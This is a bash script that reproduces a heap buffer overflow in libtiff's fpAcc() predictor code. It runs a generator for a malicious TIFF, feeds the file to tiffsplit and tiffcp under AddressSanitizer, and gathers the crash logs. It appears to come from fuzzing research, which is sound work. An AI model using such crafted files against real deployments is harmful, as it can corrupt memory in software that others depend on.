#!/bin/bash
# vuln_001_run.sh — Run PoC for VULN 001: fpAcc() heap buffer overflow
#
# NOTE: tiffsplit uses TIFFReadRawStrip which bypasses the predictor decode
# path (does not call fpAcc). This script first runs tiffsplit to confirm
# the TIFF is parseable, then runs tiffcp (which uses TIFFReadEncodedStrip)
# to demonstrate the actual heap-buffer-overflow in fpAcc().

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_predict_c"
TIFFSPLIT="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit"
TIFFCP="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffcp"
TIF="$POC_DIR/vuln_001.tif"
RESULT="$POC_DIR/vuln_001_result.txt"

cd "$POC_DIR"

# Generate the malicious TIFF if it does not already exist
if [ ! -f "$TIF" ]; then
    echo "[*] Generating vuln_001.tif ..."
    python3 "$POC_DIR/vuln_001_gen.py"
fi

rm -f "$RESULT" "$POC_DIR"/asan.log.* "$POC_DIR"/asan_cp.log.*

echo "=== Step 1: tiffsplit (bypasses decode path — uses TIFFReadRawStrip) ===" | tee -a "$RESULT"

ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan.log:detect_leaks=0" \
    "$TIFFSPLIT" "$TIF" /tmp/tiffsplit_001_out_ >> "$RESULT" 2>&1 || true

for f in "$POC_DIR"/asan.log.*; do
    [ -f "$f" ] && {
        echo "--- ASAN LOG (tiffsplit): $f ---" >> "$RESULT"
        cat "$f" >> "$RESULT"
    } || true
done

echo "" >> "$RESULT"
echo "=== Step 2: tiffcp (uses TIFFReadEncodedStrip → triggers fpAcc overflow) ===" | tee -a "$RESULT"

ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_cp.log:detect_leaks=0" \
    "$TIFFCP" "$TIF" /tmp/tiffcp_001_out.tif >> "$RESULT" 2>&1 || true

for f in "$POC_DIR"/asan_cp.log.*; do
    [ -f "$f" ] && {
        echo "--- ASAN LOG (tiffcp): $f ---" >> "$RESULT"
        cat "$f" >> "$RESULT"
    } || true
done

echo "" | tee -a "$RESULT"
echo "[*] Result written to $RESULT"
echo "--- BEGIN RESULT ---"
cat "$RESULT"
echo "--- END RESULT ---"
